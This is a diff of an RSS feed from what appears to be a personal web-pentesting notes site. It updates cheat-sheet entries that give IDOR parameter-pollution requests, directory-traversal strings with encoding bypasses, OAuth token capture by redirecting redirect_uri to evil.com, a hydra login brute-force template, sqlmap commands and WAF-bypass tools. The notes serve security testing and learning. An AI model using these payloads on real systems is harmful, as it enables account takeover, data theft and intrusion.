@@ -203,11 +203,7 @@ http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHT
       
       <guid>https://caon.io/docs/exploitation/idor/</guid>
       <description>IDOR #  Basically try to screw with evertything.
-Add parameters into the endpoints
-GET /api_v1/messages --&amp;gt; 401 vs GET /api_v1/messages?user_id=victim_uuid --&amp;gt; 200 HTTP Parameter pollution
-GET /api_v1/messages?user_id=VICTIM_ID --&amp;gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID&amp;amp;user_id=VICTIM_ID --&amp;gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution:
-POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legit_id&amp;gt;,”user_id”:&amp;lt;victim’s_id&amp;gt;} Add .json to the endpoint, if it is built in Ruby!
-/user_data/2341 --&amp;gt; 401 Unauthorized /user_data/2341.json --&amp;gt; 200 OK Test on outdated API Versions</description>
+Add parameters into the endpoints #  GET /api_v1/messages --&amp;gt; 401 vs GET /api_v1/messages?user_id=victim_uuid --&amp;gt; 200 HTTP Parameter pollution #  GET /api_v1/messages?user_id=VICTIM_ID --&amp;gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID&amp;amp;user_id=VICTIM_ID --&amp;gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: #  POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legit_id&amp;gt;,”user_id”:&amp;lt;victim’s_id&amp;gt;} Add .json to the endpoint, if it is built in Ruby! #  /user_data/2341 --&amp;gt; 401 Unauthorized /user_data/2341.json --&amp;gt; 200 OK Test on outdated API Versions #  /v3/users_data/1234 --&amp;gt; 403 Forbidden /v1/users_data/1234 --&amp;gt; 200 OK Wrap the ID with an array.</description>
     </item>
     
     <item>
@@ -231,7 +227,8 @@ Download all js files for each site and beautify: https://github.com/felipecaon/
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/lfi/</guid>
-      <description>LFI/RFI #  # https://github.com/kurobeats/fimap fimap -u &amp;quot;https://example.com?test=&amp;quot; Tricks #   PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help  Bypasses #  .// .\/ ./\ .\\ </description>
+      <description>LFI/RFI #  # https://github.com/kurobeats/fimap fimap -u &amp;quot;https://example.com?test=&amp;quot; Wget #  Sometimes browsers mess around with basic directory traversal sequences, but wget may work:
+wget http://[host]/page.php?url=../../../../../../../file.html Tricks #   PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help  Bypasses #  Nesting traversal sequences #  ....// ....\/ ..../\ ....\\ URL Encoding #  dot %2e forward slash %2f backslash %5c Double URL Encoding #  dot %252e forward slash %252f backslash %255c Null Byte #  Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else.</description>
     </item>
     
     <item>
@@ -240,7 +237,10 @@ Download all js files for each site and beautify: https://github.com/felipecaon/
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/oauth/</guid>
-      <description>OAuth 2 #  </description>
+      <description>OAuth 2 #  Grabbing OAuth Token via redirect_uri #  Redirect to a controlled domain to get the access token.
+https://www.example.com/signin/authorize?[...]&amp;amp;redirect_uri=https://localhost.evil.com OAuth implementations should never whitelist entire domains, only a few URLs so that &amp;ldquo;redirect_uri&amp;rdquo; can’t be pointed to an Open Redirect
+Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
+https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redirect_uri=https://evil.com Cross-Site Request Forgery #  Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable.</description>
     </item>
     
     <item>
@@ -278,7 +278,8 @@ Social Media Share Links #  Often a websites offers its user a feature to share 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/passwordbruteforce/</guid>
-      <description>Password Bruteforcing #  Hash identify #  # https://github.com/noraj/haiti haiti hash Test for default credentials #  # https://github.com/ztgrace/changeme ./changeme.py example.com    URl Description     https://nordpass.com/most-common-passwords-list/ Most used password by nord vpn   https://github.com/ihebski/DefaultCreds-cheat-sheet Default credentials for dozen of applications   https://cirt.net/passwords Default credentials for dozen of applications   https://forum.ywhack.com/bountytips.php?password Default credentials for dozen of applications   ## ##   https://github.</description>
+      <description>Password Bruteforcing #  Hash identify #  # https://github.com/noraj/haiti haiti hash Test for default credentials #  # https://github.com/ztgrace/changeme ./changeme.py example.com Hydra #  Hydra is a command-line tool for online password attacks, such as website login pages and ssh.
+General format for website attacks: #  hydra -L &amp;lt;username list&amp;gt; -p &amp;lt;password list&amp;gt; [host] http-post-form &amp;quot;&amp;lt;path&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;failed login message&amp;gt;&amp;quot; Wordpress #  Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:</description>
     </item>
     
     <item>
@@ -307,7 +308,7 @@ Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/s
       
       <guid>https://caon.io/docs/exploitation/sqli/</guid>
       <description>SQLi #  sqlmap #   https://github.com/sqlmapproject/sqlmap  # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --data=&amp;quot;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;quot; --method=POST # get sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; # with point of injection (*) sqlmap -u &amp;quot;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;quot; # risk sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --risk=3 --level=5 Temper #  The ability to create payloads that can bypass waf
- https://github.com/m4ll0k/Atlas  </description>
+ https://github.com/m4ll0k/Atlas  Articles #     URL     https://www.</description>
     </item>
     
     <item>
@@ -328,7 +329,8 @@ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/ssti/</guid>
-      <description>SSTI #  Tools #  # https://github.com/epinna/tplmap tplmap.py -u &#39;http://www.target.com/page?name=John&#39;    URL Description     https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Engines vulnerable to SSTI   https://github.com/payloadbox/ssti-payloads Payloads    </description>
+      <description>SSTI #  Tools #  # https://github.com/epinna/tplmap tplmap.py -u &#39;http://www.target.com/page?name=John&#39; ASP/APS.NET/ASPX #   % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt;  Tips #  Try to SSTI with the fuzz string provided in cobalt.io blog post refered below
+   URL Description     https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Engines vulnerable to SSTI   https://github.com/payloadbox/ssti-payloads Payloads   https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti Blog about SSTI    </description>
     </item>
     
     <item>
@@ -365,7 +367,8 @@ AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east
   Awesome WAF
   WAF Community Bypasses
   Known Bypasses
-  # https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites #   https://whoisrequest.com/history/ https://viewdns.info/iphistory/ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip https://securitytrails.com/domain/example.com/dns  Quick Techniques #  Given domain.</description>
+  How to bypass wafs
+  # https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites #   https://whoisrequest.</description>
     </item>
     
     <item>
@@ -374,7 +377,7 @@ AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/webtech/</guid>
-      <description>Web technologies #  Adobe AEM #   aem-hacker aemscan aem-paths.txt writeup about aem exploitation  API #   API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap  Apache #   Exploit default apache  Artifactory Hacking #   Artifactory Hacking guide  ASP.NET/IIS #   exploiting-viewstate viewgen shortname scanner  trace.axd any.aspx/trace.axd WEB-INF/web.xml /con/ /aux/ con.aspx aux.aspx Cloudflare #  Techniques to try to uncover web servers behind cloudflare:</description>
+      <description>Web technologies #  Adobe AEM #   aem-hacker aemscan aem-paths.txt writeup about aem exploitation  API #   API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap  Apache #   Exploit default apache  Artifactory Hacking #   Artifactory Hacking guide  ASP.NET/IIS #   ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner  trace.</description>
     </item>
     
     <item>
@@ -582,7 +585,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/sites/</guid>
-      <description>Sites #     Link Niche     https://www.hahwul.com/ Blog   https://netsec.expert/ Blog   https://ihorrasch.com/ Blog   https://www.agarri.fr/en Blog   https://www.100security.com.br/ Blog (portuguese)   https://www.hacking8.com/ Blog (chinese)   https://www.rcesecurity.com Blog   https://weboas.is/ Link aggregator   https://github.com/ziishaned/learn-regex Learn Regex    </description>
+      <description>Sites #     Link Niche     https://www.hahwul.com/ Blog   https://netsec.expert/ Blog   https://ihorrasch.com/ Blog   https://www.agarri.fr/en Blog   https://www.100security.com.br/ Blog (portuguese)   https://www.hacking8.com/ Blog (chinese)   https://www.rcesecurity.com Blog   https://weboas.is/ Link aggregator    </description>
     </item>
     
     <item>
